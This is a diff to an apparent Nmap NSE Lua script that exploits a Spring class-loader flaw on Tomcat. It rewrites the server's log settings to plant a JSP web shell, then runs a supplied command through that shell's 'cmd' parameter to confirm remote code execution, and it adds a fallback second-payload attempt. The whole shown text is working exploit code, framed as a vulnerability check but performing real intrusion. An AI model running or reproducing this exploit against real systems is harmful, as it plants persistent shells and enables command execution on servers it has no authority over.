@@ -52,11 +52,7 @@ action = function(host, port)
     return("ERROR: To use a 'assertion' argument, also define an 'command' argument.")
   end
 
-  local post_headers = {
-    ["content-type"] = "application/x-www-form-urlencoded"
-  }
-
-  local get_headers = {
+  local headers = {
       ["prefix"] = "<%",
       ["suffix"] = "%>//",
       ["c"] = "Runtime",
@@ -78,30 +74,26 @@ action = function(host, port)
   if shortport.http(host, port) then
     -- First POST request
     stdnse.debug("First post request")
-    local response = http.generic_request(host, port.number, "POST", endpoint, { header = post_headers, content = file_date_data, no_cache = true })
+    local response = http.generic_request(host, port.number, "POST", endpoint, { header = headers, content = file_date_data, no_cache = true })
 
     -- Change the tomcat log location variables --
     stdnse.debug("Change the tomcat log location variables")
-    local response = http.generic_request(host, port.number, "POST", endpoint, { header = post_headers, content = payload, no_cache = true })
+    local response = http.generic_request(host, port.number, "POST", endpoint, { header = headers, content = payload, no_cache = true })
     stdnse.sleep(3)
 
     -- Write the web shell --
     stdnse.debug("Write the web shell")
-    local response = http.generic_request(host, port.number, "GET", endpoint, { header = get_headers, no_cache = true })
+    local response = http.generic_request(host, port.number, "GET", endpoint, { header = headers, no_cache = true })
     stdnse.sleep(1)
 
     -- Reset the pattern
     stdnse.debug("Reset the pattern")
     local pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
-    local response = http.generic_request(host, port.number, "POST", endpoint, { header = post_headers, content = pattern_data, no_cache = true })
-
-    -- Send second payload
-    stdnse.debug("Send second payload")
-    local response = http.generic_request(host, port.number, "POST", endpoint, { header = post_headers, content = second_payload, no_cache = true })
+    local response = http.generic_request(host, port.number, "POST", endpoint, { header = headers, content = pattern_data, no_cache = true })
 
     -- Verify that RCE is working on the server
     stdnse.debug("Verify that RCE is working on the server")
-    local response = http.generic_request(host, port.number, "GET", endpoint .. "/" .. filename .. ".jsp?pwd=j&cmd=" .. command, { header = get_headers, content = pattern_data, no_cache = true })
+    local response = http.generic_request(host, port.number, "GET", "/" .. filename .. ".jsp?pwd=j&cmd=" .. command, { content = pattern_data, no_cache = true })
     local response_body = response.body
     local status = response.status
 
@@ -117,14 +109,49 @@ action = function(host, port)
           vuln.state = vulns.STATE.LIKELY_VULN
         end
         vuln.check_results = host.ip .. ":" .. port.number .. "/" .. filename .. ".jsp?pwd=j&cmd=" .. command
-        vuln.extra_info = "TESTED URL: " .. host.ip .. ":" .. port.number .. endpoint .. "\n" .. "    COMMAND: " .. command .. "\n" .. "    ASSERTION: " .. assertion
+        vuln.extra_info = "TESTED URL: " .. host.ip .. ":" .. port.number .. "\n" .. "    PATH: " .. endpoint .. "\n" .. "    COMMAND: " .. command .. "\n" .. "    ASSERTION: " .. assertion
       else
-        vuln.extra_info = "TESTED URL: " .. host.ip .. ":" .. port.number .. endpoint .. "\n" .. "    COMMAND: " .. command .. "\n" .. "    ASSERTION: " .. assertion
+        vuln.state = vulns.STATE.NOT_VULN
+        vuln.extra_info = "TESTED URL: " .. host.ip .. ":" .. port.number .. "\n" .. "    PATH: " .. endpoint .. "\n" .. "    COMMAND: " .. command .. "\n" .. "    ASSERTION: " .. assertion
+      end
+    end
+
+    -- Use second way of exploiting
+    if vuln.state ~= vulns.STATE.VULN then
+
+       -- Send second payload
+      stdnse.debug("Send second payload")
+      local response = http.generic_request(host, port.number, "POST", endpoint, { header = headers, content = second_payload, no_cache = true })
+      stdnse.sleep(3)
+
+      -- Verify that RCE is working on the server
+      stdnse.debug("Verify that RCE is working on the server")
+      local response = http.generic_request(host, port.number, "GET", "/" .. filename .. ".jsp?pwd=j&cmd=" .. command, { content = pattern_data, no_cache = true })
+      local response_body = response.body
+      local status = response.status
+
+      if status == nil then
+        -- Something went really wrong out there
+        -- According to the NSE way we will die silently rather than spam user with error messages
+        vuln.extra_info = "URL: " .. host.ip .. ":" .. port.number .. endpoint
+      else
+        if status ~= 404 then
+          if string.find(response_body, assertion) then
+            vuln.state = vulns.STATE.VULN
+          else
+            vuln.state = vulns.STATE.LIKELY_VULN
+          end
+          vuln.check_results = host.ip .. ":" .. port.number .. "/" .. filename .. ".jsp?pwd=j&cmd=" .. command
+          vuln.extra_info = "TESTED URL: " .. host.ip .. ":" .. port.number .. "\n" .. "    PATH: " .. endpoint .. "\n" .. "    COMMAND: " .. command .. "\n" .. "    ASSERTION: " .. assertion
+        else
+          vuln.state = vulns.STATE.NOT_VULN
+          vuln.extra_info = "TESTED URL: " .. host.ip .. ":" .. port.number .. "\n" .. "    PATH: " .. endpoint .. "\n" .. "    COMMAND: " .. command .. "\n" .. "    ASSERTION: " .. assertion
+        end
       end
     end
 
     return report:make_output(vuln)
-    end
+  end
 end
 
 
